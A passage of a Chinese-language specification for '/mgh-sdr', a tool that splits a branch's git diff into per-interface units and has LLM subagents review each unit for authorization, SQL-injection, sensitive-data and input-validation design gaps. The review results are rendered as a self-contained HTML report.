# security-design-review Specification

## Purpose

`/mgh-sdr`(security design review)——需求分支代码变更的存量安全设计符合性复核:以
`git diff <base>..<branch>` 为输入,按接口维度 + 独立变更单元分组 fan-out,对照 mgh-init 产出的
存量安全设计与可配置检查维度(垂直/横向越权、其他权限、SQL 注入、敏感信息屏蔽、输入校验默认开)
逐单元查设计遗漏,确定性汇总渲染一份自包含单文件 HTML 报告到项目根(附同源结构化数据
JSON 于 run 目录)。覆盖:diff 采集与分组、外部仓受控检索、
fan-out 评审、统一问题记录、报告渲染、launcher 外壳、幂等 resume 与边界校验。

## Requirements

### Requirement: 确定性 diff 采集与接口维度分组

新增确定性叶脚本 `diff_group.py`(Python ≥3.10 标准库、零运行时依赖、自定位、任意 cwd 可 `py`,
承 R5.3a)SHALL 作为 `/mgh-sdr` 的枚举与切分唯一入口:以 `--repo <abs-root>` + `--base <ref>`
(默认 `master`)+ `--branch <ref>`(默认当前分支,经 `git rev-parse --abbrev-ref HEAD` 确定性
解析)运行 `git diff --no-color <base>..<branch>`,取得变更文件清单与 hunk。脚本 SHALL 先对变更
文件清单套用**确定性排除过滤器**(分组前置,两模式共用),随后提取**变更符号集**(diff hunk 锚
到首个 added 行的宿主方法/接口:注解 + 方法声明 brace 域确定性本地扫描作单一边界源——codegraph
`node --file --symbols-only` 为 markdown 符号表、无机器 endLine,不作边界源;无法映射的 hunk 归
文件级变更),再按以下闭集规则分组:

- **排除过滤器(闭集,确定性)**:下列文件 SHALL 在分组前排除、不产生任何评审单元——
  ① 测试树与测试命名:`src/test/**`、`**/test/**`、`**/tests/**` 目录及 `*Test.java`/
  `*Tests.java`/`*IT.java` 文件名;② 构建产物:`target/**`、`build/**`、`out/**`、`dist/**`;
  ③ 生成代码:`generated/**`、`**/generated-sources/**`;④ 静态资源与第三方产物:图片/字体/
  压缩前端资源扩展(`.png .jpg .jpeg .gif .ico .svg .woff .woff2 .ttf .eot .map .min.js
  .min.css` 等,闭集枚举于脚本)及 `package-lock.json`/`yarn.lock`/`pnpm-lock.yaml`;⑤ 构建
  脚本:`pom.xml`/`build.gradle*`/`settings.gradle*`/`mvnw*`/`gradlew*`。SQL(`*.sql`)、
  MyBatis mapper XML、`application*.yml`/`*.properties` 等**不排除**(六维度检查面,按目录
  聚簇归并)。排除 SHALL 不静默:stdout/grouping.json `excluded{count, by_reason{}}` 计数,
  渲染报告诚实边界披露;`--include-excluded` SHALL 作兜底开关恢复全量评审(排除集闭集之外的
  文件不受影响)。被排除文件在 `--check` 下不计单元一致性。

- **调用链分组(codegraph 可用时)**:当 `<repo>/.codegraph/` 存在 ∧ PATH 有 `codegraph` 时,对
  每个变更符号 SHALL 跑 `codegraph callers --json` / `callees --json` 取调用边(边获取 SHALL
  **双向留存**:callees 侧在变更集内的边照旧建图,callers 侧返回的**未变更** caller 边 SHALL
  保留供向上锚定,不得丢弃),并:
  - **路由锚定单元**:含 ≥1 变更路由方法(其自身携带路由注解)的连通闭包 → **`interface`
    单元**,`route` 取该路由方法的 route 串;
  - **向上锚定单元(unchanged-route anchoring)**:对无任何变更路由可归属的变更符号,SHALL
    沿已返回的 callers 边向上走 ≤2 跳(经确定性本地注解扫描识别(含未变更的)controller
    路由方法);命中 → 该符号(及其变更集内可达下游)并入该路由的 `interface` 单元,slice
    SHALL 附路由方法源码片段(有界)作上下文;向上 ≤2 跳仍无路由 → 落残余归并;
  - **共享链合并**:同一 controller 文件内多个变更 route,若其下游变更符号可达集相同或互为
    可达,SHALL 合并为一个 `interface` 单元(`route` 承载全部路由串);可达集不同的保持拆分;
  - **残余归并**:锚定/闭包/向上锚定后仍未归属的 java 残余文件 SHALL 与非 java 残余一致,
    按目录聚类 + `--max-standalone-bytes` 预算归并为 `standalone` 单元(SHALL NOT 每文件
    强制独立成单元);
  - **判不穿退化**:反射/DI/AOP 残差(无调用边)或 codegraph 整体不可用时,该符号/整个流程
    退化为注解启发式接口单元 + 目录簇 standalone,流程不失败(启发式非承诺)。

两种模式下,分组 SHALL 是**启发式非承诺**:接口识别失败(无注解、非 java web)SHALL 退化为
standalone 单元,流程不失败。**共享下游跨 controller** SHALL 按接口拆:一个变更符号被不同
controller 文件的多个 interface 单元引用时不跨文件合并,该符号 hunk 在每个引用它的 interface
单元 slice 内重复(受单元预算),跨单元重复 finding 交渲染侧三元组去重。每单元 SHALL 物化一份
**只读 slice 文件**(diff hunk + 有限邻近上下文,含文件相对路径、变更类型 A/M/D/R 标注;向上
锚定单元另附路由方法源码片段),落 `<repo>/.mgh-sdr/runs/<ts>/slices/`。**interface 单元
SHALL 受字节预算约束**(默认 256KB,`--max-interface-bytes` 可调):合并后超预算的单元 SHALL
确定性拆为续单元(`unit_id` 带 `(part N)` 形态后缀),避免单 slice 撑爆 subagent 上下文;
`--max-standalone-bytes` 继续辖 standalone 归并。

**调用链物化(chain materialization)**:codegraph 模式下,每个 `interface` 单元 SHALL 在
grouping.json `units[]` 项新增 `chain[]` 数组——从路由方法沿调用边到分析可达终点的**确定性
节点序列**,零新增 codegraph 查询(复用分组期已返回的原始调用边,含此前被丢弃的未变更下游边;
spec 承诺的链 = 分组期已获数据的一次性确定性投影,SHALL NOT 要求任何新查询):

- **节点 schema**:`{fqn_short, label, file, line, change, route?}`,`fqn_short` = FQN 短形
  (仅保留类名/文件名:方法名,如 `OrderController.submit`;非 java 文件用
  文件名)、`label` = 人读标签(类短名.方法名)、`file` = repo 相对路径、`line` = 符号声明
  行(取 codegraph 返回的 startLine)、`change` ∈ `changed|unchanged|external`、`route` 仅
  路由节点携带(route 串);
- **顺序与分支表达**:数组序 = 主链从入口到深处的线性序;分叉节点以 `branch_of`(指向宿主
  节点在数组中的下标)表达,渲染器展开为 `⤷` 平铺与章节三 mermaid 边;
- **接口消解**:同名符号的接口声明与实现并列时 SHALL 消解为实现(实现优先,接口跳不重复入
  链);同名歧义不可消解时保留两者并标 `change: unchanged`;
- **mapper XML 终端**:dao 方法节点后 SHALL 追加 mapper XML 终端节点(确定性扫描 repo 内
  `*.xml`:namespace = dao FQN ∧ statement id = 方法名;命中 → 追加 `{fqn_short: <文件名>,
  change: external}`,XML 不在 codegraph 图内,此跳为确定性补全);未命中 → 不追加(链止于
  dao 方法);
- **覆盖义务**:route 节点(含向上锚定的未变更路由入口,标 `change: unchanged`)、沿途全部
  变更符号、变更符号的变更集内下游、每条 dao 链的 mapper 终端均 SHALL 在链上;codegraph
  边数据缺失的符号(判不穿)SHALL 不阻断——该符号不入链,分组/流程不失败;
- **degrade**:codegraph 不可用时 `units[].chain[]` 恒为 `[]`(空数组在,结构可探测),行为
  与现退化路径逐字等价。

`--materialize <dir>` SHALL 枚举 `pending[]`:每项含 `unit_id`(文件系统安全命名,`/ \ :`
一律 `_`,承 NTFS ADS 教训)、`input_path`(slice 绝对路径,`Path.resolve()` 绝对且在 repo
子树内)、`draft_path`/`done_marker`/`failed_marker`(同形绝对)、`kind`(`interface`|
`standalone`)、`route`(interface 单元的路由串,合并单元可为多路由分号连接;standalone 为
空串)、`unit_bytes`;standalone 单元 `chain[]` 恒为 `[]`。stdout 另携带 `repo` 锚、
`branch`/`base`、`total`/`done`/`failed`、`counts{interface,standalone}`、`codegraph`(bool:
本次是否走调用链分组)、`excluded{count, by_reason{}}` 与 `codegraph_stats{...}`(分组可观测,
即使 codegraph 整体不可用亦 SHALL 携带零值结构)。退出码 `0/1/2`;stdout=结构化 JSON、
stderr=诊断严格分流;`--check <run-dir>` 校验 run 产物自洽(slice 齐备、pending 路径绝对且在
repo 子树、manifest 字段一致、`chain[]` 结构合法——每项节点含必填字段、`branch_of` 若存在
SHALL 指向合法下标或不存在),失败退出 2(承 R5.9)。零变更 diff SHALL 退出码 0 且
`pending: []` + stdout `empty:true`,不进入 fan-out。

#### Scenario: 同链变更合并为接口调用链单元

- **WHEN** 某 diff 触及 `OrderController.java` 的 `@PostMapping("/order/create")` 方法、
  `OrderService.java` 的 `createOrder` 方法、`OrderDao.java` 的 `insertOrder` 方法,且 codegraph
  调用边表明 `OrderController.createOrder` → `OrderService.createOrder` → `OrderDao.insertOrder`
- **THEN** `diff_group.py --materialize` 产出 1 个 `kind=interface` 单元(route=`/order/create`,
  slice 含三者 hunk 与类级注解上下文),`chain[]` = 4 节点线性链(3 个 changed 节点 +
  1 个 mapper external 终端),`fqn_short` 为仅类名短形(如 `OrderController.insertOrder`)

#### Scenario: 反射/DI 判不穿的变更落独立单元

- **WHEN** 某 diff 触及 `PayService.java` 的 `pay` 方法(经反射/DI 注入被调用,codegraph 无其
  调用边)与 `AuditService.java` 的 `log` 方法(彼此无调用边)
- **THEN** 两方法不产生 interface 单元;java 残余按目录聚类 + `--max-standalone-bytes` 归并
  (可达集不同不硬塞同链),流程退出码 0、pending 非空、不失败

#### Scenario: 向上锚定单元的链入口是未变更路由节点

- **WHEN** 某 diff 仅触及 `OrderService.createOrder` 与 `OrderDao.insertOrder`(controller 无
  改动),codegraph callers 表明 `OrderController.createOrder`(路由 `/order/create`,未变更)
  直接调用 `OrderService.createOrder`
- **THEN** 产出 1 个 `kind=interface` 单元(route=`/order/create`),`chain[0]` 为
  `{fqn_short: OrderController.createOrder, change: "unchanged", route: "/order/create"}`,
  后续节点为两个 changed 节点 + mapper 终端

#### Scenario: 分叉链以 branch_of 表达

- **WHEN** 某 diff 触及 `UserServiceImpl.deleteUser`(其内部调 `UserDao.deleteById` 与
  `LogDao.insertDeleteLog` 两个下游)
- **THEN** 该单元 `chain[]` 顺序为 deleteUser → deleteById → mapper 终端 →
  insertDeleteLog → mapper 终端,两个 mapper 终端的 `branch_of` 指向各自 dao 节点下标(渲染
  为 `⤷`);单元章节三获得一张 mermaid 分支图

#### Scenario: mapper XML 终端确定性补全

- **WHEN** 链上某 dao 方法 `OrderDao.insertOrder` 在 repo 的 `OrderDaoMapper.xml` 中存在
  `<mapper namespace="...OrderDao">` 下 `<insert id="insertOrder">` 语句
- **THEN** 链追加节点 `{fqn_short: "OrderDaoMapper.xml", change: "external"}`(label 携带
  statement id);repo 无对应 XML 或 namespace/id 不匹配时不追加

#### Scenario: 测试与构建产物被排除且披露

- **WHEN** 某 diff 触及 `src/main/java/.../UserService.java`、`src/test/java/.../UserServiceTest.java`
  与 `target/classes/.../UserService.class`(源码改动 + 测试 + 构建产物)
- **THEN** `diff_group.py` 仅为 `UserService.java` 产生评审单元;stdout
  `excluded.count >= 2` 且 `by_reason` 区分 `test-tree`/`build-output`;报告诚实边界列出排除
  计数

#### Scenario: SQL 与 mapper XML 不被排除

- **WHEN** 某 diff 触及 `src/main/resources/mapper/UserMapper.xml` 与 `db/migration/V2__x.sql`
- **THEN** 两文件均进入评审单元(目录聚簇),`excluded.by_reason` 不含它们

#### Scenario: 兜底开关恢复全量评审

- **WHEN** 操作者传 `--include-excluded` 重跑同一 diff
- **THEN** `*Test.java` 等文件回归 standalone 归并流程产生单元,`excluded.count == 0`

#### Scenario: 无 codegraph 时 chain 恒空

- **WHEN** `<repo>/.codegraph/` 不存在或 PATH 无 `codegraph`
- **THEN** 分组退化为注解启发式接口单元 + 目录簇 standalone,stdout `codegraph:false` 且
  `codegraph_stats` 零值结构在;全部单元 `chain[] == []`,行为与无 codegraph 时逐字等价

#### Scenario: 无 codegraph 退化为注解+目录分组

- **WHEN** `<repo>/.codegraph/` 不存在或 PATH 无 `codegraph`
- **THEN** 分组退化为注解启发式接口单元 + 目录簇 standalone,stdout `codegraph:false`;
  行为与无 codegraph 时逐字等价

#### Scenario: 共享下游按接口拆、不并成一个分量

- **WHEN** 某 diff 触及 `UserController.java` 的 `/user/detail` 与 `/user/list` 两个接口,两者都
  调变更的 `UserService.queryUser`,而 `DeptController.java` 的变更 route 也调它
- **THEN** `UserController` 文件内的同链 route 按共享链合并规则归并;`DeptController` 侧保持
  独立 interface 单元(跨 controller 不合并),`UserService.queryUser` 的 hunk 在两单元 slice
  内各出现一次;两单元若产相同 finding 由渲染侧三元组去重

#### Scenario: 合并后超预算拆续单元

- **WHEN** 某 interface 单元合并多链后 slice 超 `--max-interface-bytes`(默认 256KB)
- **THEN** 该单元确定性拆为多个 part 单元(`unit_id` 带 part 后缀),每片均在预算内,pending
  各项 `input_path` 独立

#### Scenario: controller 未变更时经向上锚定归链

- **WHEN** 某 diff 仅触及 `OrderService.createOrder` 与 `OrderDao.insertOrder`(controller 无
  改动),codegraph callers 表明 `OrderController.createOrder`(路由 `/order/create`,未变更)
  直接调用 `OrderService.createOrder`
- **THEN** 产出 1 个 `kind=interface` 单元(route=`/order/create`),slice 含两者 hunk + 路由
  方法源码片段上下文,而非 2 个散落 standalone 单元

#### Scenario: 向上 2 跳仍无路由落残余归并

- **WHEN** 某 diff 触及 `PayService.pay`(反射调用,callers 为空)与 `AuditService.log`(仅被
  另一非路由方法经 2 跳以上间接调用)
- **THEN** 两者不产生 interface 单元,java 残余按目录聚类 + 预算归并为少量 standalone 单元,
  流程退出码 0

#### Scenario: 同 controller 共享下游链合并

- **WHEN** `UserController` 的 `/user/detail` 与 `/user/list` 两个变更 route 的下游变更符号
  可达集相同(都调 `UserService.queryUser`)
- **THEN** 产出 1 个 `kind=interface` 单元,`route` 同时承载两路由串;可达集不同时不合并

#### Scenario: codegraph 缺失时退化并携带零值统计

- **WHEN** `<repo>/.codegraph/` 不存在或 PATH 无 `codegraph`
- **THEN** 分组退化为注解启发式接口单元 + 目录簇 standalone,stdout `codegraph:false` 且
  `codegraph_stats` 各字段为 0(结构在),行为与无 codegraph 时等价

#### Scenario: 零变更 diff 空转

- **WHEN** `--base master --branch X` 且 X 与 master 无任何差异
- **THEN** 退出码 0,stdout `{"empty": true, "pending": [], ...}`,编排器不 spawn 任何
  subagent,仍渲染一份「无变更」报告

### Requirement: fan-out 评审单元与 6 维度默认检查面

编排器 SHALL 经 `fanout_runner.py --tier sdr` 波次派发评审:每个 pending 单元一个 subagent
(`sdr-review-fanout` agent 定义;claude 侧经 `--agents` inline JSON,opencode 侧 `mode: primary`
克隆),任务消息由固定模板 `core/prompts/fragments/fanout/sdr-task.md` + 该单元 `pending[]` 字段
逐字填充。subagent SHALL **恰好读** `input_path`(slice 文件)、**恰好写** `draft_path`(统一
JSON 问题记录)+ touch `done_marker`,NEVER 读其他单元的 slice 或其他分支产物。默认检查维度 SHALL
为闭集 6 项:`vertical-authz`(垂直越权)、`horizontal-authz`(横向越权)、`other-authz`(其他
权限问题)、`sql-injection`(SQL 注入)、`sensitive-data`(敏感信息屏蔽)、`input-validation`(输入
校验);检查面 SHALL 经 `--dimensions <inline-json|@path>` 参数化收窄或扩展(闭集校验,维度键
闭集 + 扩展维度仅作自由文本检查项透传;非法键退出码 2 早停,任何 LLM token 之前)。每条问题
记录(draft `findings[]` 项)SHALL 统一 schema:`{dimension, severity(high|medium|low|info),
route, file, line_hint, line(int,问题锚定行,可选), risk(风险描述,写法见下方写作纪律),
suggestion(整改建议,写法见下方写作纪律), repro(可选,复现方式), fix_diff(可选,修复
前后代码对比), control_ref(命中的存量安全设计名或 null)}`。

**人类面字段写作纪律**(任务模板 SHALL 逐字承载,三面 agent 定义的 Output schema 行同步):
`risk`/`suggestion`/`repro`/`fix_diff` 是给人读的文本——读者画像见能力
`human-facing-output-discipline`(一两年 Java Web 经验的工程师,不懂本工具内部概念)。
写法上 SHALL:

- `risk` 第一句写现象:谁、从什么入口、传什么参数 → 发生什么;技术根因放后面。
- 问题能落到具体接口/方法调用时 SHALL 带 `repro`,写「怎么调 + 传什么 + 看到什么」
  (示例:以任一有效登录会话 POST /user/del 传他人 id → 他人记录被删除);设计缺失类
  构造不出具体调用的,可以省略。
- 改动只有一两处代码时 SHALL 带 `fix_diff`(1–2 组 `{before, after}`;`before` 从 slice
  里逐字摘原文,`after` 写改后的样子);改动更多或跨文件重构时省略,`suggestion` 文字
  说清楚即可。
- 禁用能力 `human-facing-output-discipline` 闭集里的内部词;越权、IDOR、SQL 注入、脱敏、
  白名单这类安全常用词是读者的工作语言,不受限。

`sensitive-data` 维度 SHALL 依编排器透传的敏感目录执行(见
「敏感目录复用与回退」要求);6 维度各自的判定锚点是**存量安全设计**(AGENTS.md 安全章节 +
`docs/security-controls/*.md` + 项目记忆),subagent task 消息 SHALL 逐字携带编排器从存量设计
投影出的**检查基线摘要**(确定性由 `sdr_context.py` 产出,≤ 预算字节),NEVER 要求 subagent 自行
读全部 rules 文件。

#### Scenario: 接口单元产出统一 schema 问题记录

- **WHEN** 某 `kind=interface` 单元(路由 `/user/detail`)的 slice 显示新增接口按入参 `brch_no`
  查询但调用链无 `UserContext.get()` 校验,而存量设计声明「横向越权须 brch_no + UserInfo 校验」
- **THEN** 该单元 draft 含一条 `{dimension:"horizontal-authz", severity:"high", route:"/user/detail",
  file:"UserController.java", risk:<未按存量设计校验的中文描述>, control_ref:<存量设计名>}` 的
  finding,且该 finding 可被渲染器与其他单元的去重合并

#### Scenario: 可复现问题携带复现方式

- **WHEN** slice 显示新增接口 `/user/del` 直接以请求参数 `id` 调用 DAO 删除(无归属校验)
- **THEN** 该 finding 带 `repro`,内容是「怎么调 + 传什么 + 看到什么」(如:以任一有效登录
  会话 POST `/user/del` 传他人 `id` → 他人记录被删除),不含闭集词

#### Scenario: 局部修复携带前后代码对比

- **WHEN** 某 finding 的整改点 = 在 DAO 查询单处追加数据归属条件
- **THEN** 该 finding 带 `fix_diff: [{before: <slice 内原查询原文>, after: <含归属条件的
  修改后形态>}]`;整改点超过 2 处或属跨文件重构的 finding 省略该字段

#### Scenario: 写作纪律进任务模板与 agent 定义

- **WHEN** 检查 `sdr-task.md` 任务模板与三面 agent 定义(opencode/claude `sdr-review-fanout`、
  dsh tier agent)的产物文件
- **THEN** 模板含写作纪律节和扩字段后的 draft schema 示例,输出字段的描述文字自身零闭集词,
  三面 agent 定义的 Output schema 行与之一致(确定性文档面,机器可对账)

#### Scenario: 检查面参数化收窄

- **WHEN** 编排器传 `--dimensions '{"dimensions":["sql-injection","input-validation"]}'`
- **THEN** subagent 仅对这两个维度产出 findings(sensitive-data 目录不透传),其余维度不检查;
  manifest 记录实际检查面

#### Scenario: 非法维度键早停

- **WHEN** 编排器传 `--dimensions '{"dimensions":["crypto-audit"]}'`(非闭集且非自由文本扩展形态)
- **THEN** 编排器在任何 subagent spawn 之前以退出码 2 fail-loud,stderr 给出合法维度清单

### Requirement: 存量安全设计基线投影与外部仓受控检索

新增确定性叶脚本 `sdr_context.py`(标准库、自定位、退出码 0/1/2,stdout/stderr 分流)SHALL 产出
两类输入供 fan-out 消费:**(a) 检查基线摘要**——从 `<repo>` 的存量安全设计来源(`AGENTS.md`
安全相关章节、`docs/security-controls/*.md`、`<repo>/.mgh-sra/business_context.json`(若存在))
确定性抽取与 6 维度相关的段落,按字节预算(默认 ≤32KB,`--baseline-budget-bytes` 可调)投影为
单文件基线 slice,预算超限按「接口授权 > SQL > 输入校验 > 敏感数据」优先级截断并在 stdout 显式
披露 `baseline_truncated:true`;**(b) 外部仓受控检索**——解析存量设计中的**外部仓声明**
(约定形态:正则匹配「前端/外部项目本地绝对路径 + 同名分支约定」类描述;命中即产出 `external_repos[]`
声明对象 `{path, branch_sync_note}`),对每个可达的外部仓在本流程**主进程内**(launcher 外壳
/编排器 step 1,NEVER 在 subagent 内)执行受控检索:外部仓同名分支的 `git diff`(同 base)变更
文件清单 + 定向内容命中(配置权限文件——如声明中点名的 `buttonAuth.properties`——中含本分支新增
接口路由与否;**前端仓中新增接口路由字符串出现处计数**——正则 SHALL 与 diff_group 的路由注解
族对齐(含 `@RequestMapping` 及组合注解),并拼接类级 base route(平凡可判定时)),结果落盘
为 `<run-dir>/external/<repo-slug>/` 下的小体积结论文件(逐仓字节预算,默认 ≤64KB,超限截断
披露),**并 SHALL 将逐路由计数落盘进 context.json `external_repos[].route_hits[]`**
(`{route, count}` 列表;此前仅存在于 hits.md 文本、render 不可确定性消费),并输出该仓**根绝
对路径**供编排器写入运行域哨兵 `read_roots[]`。检索前 SHALL 先对项目配置
`<repo>/.mgh/read-roots.json` 核对授权:**已配置**(条目存在且为目录)的外部仓照常检索;**未配置**
的外部仓 SHALL NOT 被检索(该仓零读取),降级为 `external_skipped:"unapproved: <path>"` 并在
stdout 输出 `pending_approval:[<abs>…]`,流程继续不失败。外部声明不存在、路径不可达、非 git
目录、未获配置授权四者任一 SHALL 降级为 `external_repos: []` + stdout `external_skipped:<原因>`,
流程继续不失败。subagent task 消息 SHALL 仅携带结论文件的路径(逐字透传),NEVER 携带外部仓原始
路径供 subagent 自行读取。`--check <run-dir>` 校验两类产物自洽(新增校验:`route_hits[]` 存在时
SHALL 为 `{route, count}` 列表形态)。

#### Scenario: 前端路由计数进入 context.json 可被 render 消费

- **WHEN** 存量设计声明前端仓 `D:/xxx/front`(存在、git 可达、**已配置**),本分支新增路由 `/order/submit`
  与 `/cache/user/direct`,前端仓文本文件分别命中 2 处与 0 处
- **THEN** context.json `external_repos[0].route_hits` 含 `{route:"/order/submit", count:2}`
  与 `{route:"/cache/user/direct", count:0}`,render 简报表该路由行前端两列为「是 / 2 处」与
  「否 / —」;`@RequestMapping` 族路由(非组合注解)同样被计数

#### Scenario: 存量设计声明前端仓时检索结论被物化

- **WHEN** `AGENTS.md` 安全章节含「本地前端项目地址 D:/xxx/front,前端分支名与本项目一致;
  垂直越权以 buttonAuth.properties 配置为准」,该目录存在且 `D:/xxx/front` 已在
  `.mgh/read-roots.json` 配置中
- **THEN** `sdr_context.py` 产出基线 slice + `external/<slug>/` 结论文件(含本分支新增接口路由在
  `buttonAuth.properties` 的命中清单 + 前端出现计数),stdout 声明 `external_repos: [{path:"D:/xxx/front",...}]`;
  后续接口单元 subagent 读到的 task 消息含该结论文件路径而非 `D:/xxx/front`

#### Scenario: 未配置的外部仓跳过检索并进入待批清单

- **WHEN** 存量设计声明 `D:/xxx/front`(目录存在)但 `.mgh/read-roots.json` 不含该路径
- **THEN** `sdr_context.py` 对该仓零读取,stdout `external_skipped: "unapproved: D:/xxx/front"`
  且 `pending_approval` 含 `D:/xxx/front`,`external_repos: []`,流程以纯后端 diff 继续

#### Scenario: 声明路径不可达时降级继续

- **WHEN** 存量设计声明 `D:/xxx/front` 但该目录不存在
- **THEN** stdout `external_skipped: "not-found: D:/xxx/front"`,`external_repos: []`,流程以纯
  后端 diff 继续跑完并渲染报告;报告边界声明「外部仓声明不可达,前端相关检查面未覆盖」,简报表
  前端两列为「未知 / —」

#### Scenario: 基线超预算按优先级截断

- **WHEN** 存量设计安全章节 + security-controls 合计远超 32KB 预算
- **THEN** 基线 slice 按维度优先级保留「接口授权」相关段落、截断尾部,stdout
  `baseline_truncated: true` + 截断字节数;manifest `boundaries[]` 披露「基线经截断,低优先级
  维度的存量设计细节未全量投影」

### Requirement: 统一问题记录汇总与确定性报告渲染

新增确定性叶脚本 `render_sdr_report.py`(标准库、退出码 0/1/2、`--check` 承 R5.9)SHALL 收
run 目录下全部 fan-out 单元 draft(`.done` 且 JSON 可解析者;`.failed` 单元以 stderr 汇总 +
manifest `failed_units[]` 计入,不阻断渲染),按 `{dimension, route, file}` 三元组去重合并,
渲染 `<repo>/<工具名>-<分支名>-<YYYYMMDD_HHMMSS>.html`(工具名固定 `mgh-sdr`;分支名取文件系统
安全命名;时间戳到秒、本地时区)。报告 SHALL 为**自包含单文件 HTML**:样式、脚本、数据全部
内嵌,SHALL NOT 引用任何外部资源(网络 URL 的脚本/样式/字体/数据、CDN、外链图片一概不产),
file:// 双击用任意现代浏览器打开即可阅读,不依赖联网与任何已安装工具。报告 SHALL 为简体中文、
面向人读,结构:

- **头部**(分支/base/时间/检查面/敏感目录来源/外部仓结论摘要 + 分组概览):分组概览 SHALL
  满足本需求「报告确定性文案措辞」段和能力 `human-facing-output-discipline` 的出口守卫
  要求;
- **章节一「简报表」**(本需求的核心结构):HTML 表格,**行 = 评审单元**(排序:interface 按
  route 升序、standalone 殿后按 unit_id;多路由单元按首路由参与排序),列 = 接口/方法入口、
  调用链、是否前端接口、前端使用次数、6 维度各一列(默认闭集维度;自由扩展维度各追加一列)。
  各列 SHALL 满足:入口列 = route 串(standalone 或无路由 = 该独立方法定义 `fqn_short`);
  调用链列 = 缩写链文本(按 grouping.json `units[].chain[]` 确定性渲染:仅保留类名/文件
  名:方法名,如 `OrderController.submit → OrderServiceImpl.submit`,真仓试用后由「包段
  首字母 + 类名」形态收敛,完整包路径可由 file 列还原,`·` 同类延续、`⤷` 分支(`branch_of` 宿主)、`⇢` mapper XML 终端、
  `†` 未变更节点;`chain[]` 为空(standalone/codegraph off)= 该单元方法定义短形;入口
  = 方法定义时链写到分析可达处);**入口列与调用链列的每个「类名.方法名」短形 SHALL 渲染为
  指向仓内源文件的链接**(见本需求「源文件链接渲染」段);前端两列 = 按 route join
  context.json `external_repos[].route_hits[]`(声明 ∧ 命中 >0 = `是`+`N 处`;声明 ∧ 0 命中 =
  `否`+`—`;无声明/不可达 = `未知`+`—`;多路由单元仅按主路由(分号串第一段)join,次路由命中
  不抬升主路由状态);维度列 = `否` 或 `是 [P-NN]`(该单元该维度的合并 findings 编号列表,
  **P-NN SHALL 为页内锚点链接**,点击跳转到章节二对应条目——HTML 形态下页内跳转由本报告
  自身保证,SHALL NOT 依赖任何外部工具;原 MD 形态下「SHALL NOT 产出内部锚点」的禁令
  系目标编辑器不支持所致,随报告形态切换一并废止;本约束 SHALL NOT 及于指向仓内源文件的
  链接,后者是本需求的交付内容);
- **章节二「问题详述」**:合并去重后的每条 finding 一小节,统一 `P-NN` 编号(全局递增,
  条目锚点 = 其页内跳转目标),标题形态 `P-01 · <维度中文标签> · <route 或独立方法> ·
  <severity 中文>`;正文含位置(`file:line`——line 取 draft 新增 `line` 字段(问题锚定行号,
  数值);draft 缺 `line` 时降级为 `file`(不硬失败,旧 draft 兼容);位置文本 SHALL 渲染为
  指向该源文件的链接(见「源文件链接渲染」段))、风险、建议、control_ref,以及两项可选
  展示——**复现方式**(draft 带 `repro` 就渲染一行「复现方式」;没有就省略,不报错)与
  **修复对比**(draft 带 `fix_diff` 就按 1–2 组「修改前/修改后」代码块渲染:等宽字体、
  上下堆叠、代码文本走 textContent 注入路线;没有就省略,不报错);排序 severity
  升序(高→提示)、同 severity 按 P-NN;
- **章节三「分支调用链图」**:仅含带真实分支(`chain[]` 存在 **非 external** 节点携带
  `branch_of`——即 java 调用扇出;mapper 终端节点按编码也带 `branch_of`,但不构成真实
  分支)的单元,每单元一张**内嵌 SVG 有向图**(渲染器按 `chain[]` 确定性生成分层布局:
  入口 → 逐节点 → mapper 终端虚线边;`⤷` 分支、`⇢` 终端、`†` 未变更节点语义全部保留),
  SHALL 支持缩放与平移(页内交互),SHALL NOT 依赖任何外部图形库;线性链单元(含仅 ⇢ 终端
  带 `branch_of` 的直连 dao 短链)SHALL NOT 入本节;SVG 节点 SHALL NOT 承载源文件超链接
  (源文件跳转统一由章节一表格与章节二承担,图形节点仅悬停提示 `file:line`);
- **「无问题单元」清单**(保留,供 merge 前放行参考)+ **诚实边界节**(≥7 条,含排除集披露,
  保留现行)。

**报告确定性文案措辞**:报告里全部由渲染器**确定性产出**的文案——头部分组概览、诚实边界
条目、排除/失败/截断披露、章节标题、表头、图例——SHALL 用校准读者(一两年 Java Web 开发
经验的工程师,见能力 `human-facing-output-discipline`)能顺读的平实简体中文书写,SHALL NOT
携带分组算法/流水线的实现词汇。禁用闭集 = 能力 `human-facing-output-discipline` 的核心
词表 + sdr 域补充词表(路由锚、向上锚定、锚定单元、目录聚簇、判不穿、残余归并、链合并、
检查面,及概览分类语境的 interface / standalone)。闭集词的概念要用
读者的话转述(词表每个词条都带公认的人话替身,如「向上锚定」→「改动挂接到未变更的接口」);分组诊断的数字(调用边数等)
SHALL 保留在数据文件里,报告默认视图可以收进默认折叠的「分组诊断」明细——信息不丢,
默认视图不闹。诚实边界 ①–⑦ 条的**语义逐条保留**,措辞按本段转述。

**读者模拟评审与文本束**(拦模型临场新造的难懂词,机制见能力 `human-facing-output-discipline`
的「读者模拟评审」要求):渲染 SHALL 同步写出 `<run-dir>/readability_text_bundle.json`——
合并后全部人类面文本字段(P-NN + risk/suggestion/repro/fix_diff 文本)的单一文本束,它是
读者模拟评审的唯一输入。编排器 SHALL 在首次渲染后派发**一次**有界评审 subagent(任务模板
`core/prompts/fragments/fanout/readability-review.md`:读文本束 → 写
`<run-dir>/readability_advisories.json` → 回传单行有界 ack),然后**重渲染**(渲染幂等、原子
覆盖):建议文件存在且可解析 → 数据文件增可选 `readability[]` 字段、报告增设默认折叠的
「可读性自检」小节 + stderr 报一条计数;缺席或不可解析 → 小节与字段省略 + stderr note。
评审是尽力而为:未派发、失败、空产出都不阻断流程、不改退出码、不影响 resume 收尾;
评审 SHALL NOT 改写任何产物正文;建议词经维护者确认后进闭集(「发现 → 沉淀」增长闭环)。

**源文件链接渲染**(渲染规则,报告写在目标仓根目录 ⇒ 链接目标 = 源文件相对仓根的相对路径):

- 链接形态 `<a href="<相对路径>#L<line>">显示文本</a>`;`line` 缺失或为 `null` 时 SHALL
  退化为 `<a href="<相对路径>">显示文本</a>`(不带锚点)。
- 路径解析:chain 节点 `file` 与 finding `file` 为相对路径(相对 `--repo`)时直接作链接
  目标(输出统一 `/` 分隔);为绝对路径时,resolve 后在 `--repo` 子树内 → 转为相对路径,
  在子树外 → **不产链接**(降级纯文本,报告里没有指向仓外的死链);字段缺失/空 → 纯文本。
  路径解析 SHALL NOT 依赖文件真实存在(diff 分支的源文件可能未检出到工作树;链接坏与否由
  浏览器呈现,渲染器只做词法判定,NEVER 因此 stat 目标文件)。
- 显示文本 = 现行短形(`fqn_short` 等,含 `†` 前缀)逐字不变;`·`/`⤷`/`⇢`/`→` 分隔符不
